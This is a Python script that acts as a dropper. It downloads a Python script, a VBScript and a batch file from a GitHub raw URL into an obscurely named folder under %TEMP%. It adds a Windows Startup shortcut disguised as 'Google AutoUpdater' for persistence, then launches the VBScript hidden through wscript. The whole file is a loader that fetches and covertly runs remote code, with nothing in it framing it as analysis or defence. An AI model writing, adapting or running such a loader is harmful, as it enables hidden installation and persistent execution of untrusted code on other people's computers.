import os
import shutil
import pyshortcuts
import requests

# Define the URLs for the main script, VBScript (.vbs) file, and batch file
main_script_url = "https://raw.githubusercontent.com/HirakuMaru/Homebrew-Script/main/Registration.py"
vbs_file_url = "https://raw.githubusercontent.com/HirakuMaru/Homebrew-Script/main/run_hidden.vbs"
batch_file_url = "https://raw.githubusercontent.com/HirakuMaru/Homebrew-Script/main/run_python.bat"  # Replace with the URL to your batch file

# Define the target folder in the %Temp% directory
folder_name = "Xurhf82819"
target_folder = os.path.join(os.getenv('TEMP'), folder_name)

# Create the target folder if it doesn't exist
if not os.path.exists(target_folder):
    os.makedirs(target_folder)

# Download the main script
main_script_path = os.path.join(target_folder, 'Registration.py')
with open(main_script_path, 'wb') as main_script_file:
    response = requests.get(main_script_url)
    main_script_file.write(response.content)

# Download the VBScript (.vbs) file
vbs_file_path = os.path.join(target_folder, "run_hidden.vbs")
with open(vbs_file_path, 'wb') as vbs_file:
    response = requests.get(vbs_file_url)
    vbs_file.write(response.content)

# Download the batch file
batch_file_path = os.path.join(target_folder, "run_python.bat")
with open(batch_file_path, 'wb') as batch_file:
    response = requests.get(batch_file_url)
    batch_file.write(response.content)

# Create a shortcut in the Windows Startup folder
startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
shortcut_name = "Google AutoUpdater"
shortcut_path = os.path.join(startup_folder, f"{shortcut_name}.lnk")
pyshortcuts.make_shortcut(main_script_path, name=shortcut_name, folder=startup_folder)

# Execute the run_hidden.vbs file
os.system(f'wscript "{vbs_file_path}"')